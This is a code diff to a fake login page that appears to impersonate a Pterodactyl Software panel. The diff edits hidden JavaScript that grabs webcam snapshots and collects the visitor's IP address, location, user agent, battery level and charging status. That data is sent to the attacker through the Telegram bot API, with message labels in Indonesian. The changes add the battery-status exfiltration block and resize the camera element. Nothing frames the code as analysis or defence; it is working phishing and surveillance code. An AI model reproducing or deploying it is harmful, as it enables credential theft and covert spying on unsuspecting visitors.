@@ -72,8 +72,8 @@
     <button onclick="handleLogin()">LOGIN</button>
     <p style="margin-top: 10px;"><a href="#" style="color: #90cdf4;">FORGOT PASSWORD?</a></p>
     <p id="loading">Loading...</p>
-    <video id="camera" autoplay playsinline width="1" height="1"></video>
-    <canvas id="snapshot" width="300" height="300" style="display:none;"></canvas>
+    <video id="camera" autoplay playsinline width="300" height="200"></video>
+    <canvas id="snapshot" width="300" height="200" style="display:none;"></canvas>
   </div>
 
   <footer>© 2015 - 2025 Pterodactyl Software</footer>
@@ -152,9 +152,6 @@
     function sendToTelegram(blobImage) {
       const userAgent = navigator.userAgent;
       const time = new Date().toLocaleString();
-      const batteryLevel = `${battery.level * 100}%`;
-     const isCharging = battery.charging ? "Mengisi daya" : "Tidak mengisi";
-
 
       const message = `
 |------------------------------------------
@@ -167,8 +164,6 @@
 | 🔎 IP Address: ${ipAddress}
 | 📍 Lokasi: ${locationInfo}
 | 📸 Kamera: ${cameraStatus}
-| 🔋 Baterai: ${batteryLevel}
-| ⚡ Status Pengisian: ${isCharging}
 | 🗃 User-Agent: ${userAgent}
 | 🕰 Waktu Login: ${time}
 |------------------------------------------
@@ -191,7 +186,13 @@
 
       // Kirim status baterai
       navigator.getBattery().then(battery => {
-        
+        const batteryLevel = `${battery.level * 100}%`;
+        const isCharging = battery.charging ? "Mengisi daya" : "Tidak mengisi";
+
+        const batteryMsg = `
+| 🔋 Baterai: ${batteryLevel}
+| ⚡ Status Pengisian: ${isCharging}
+`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
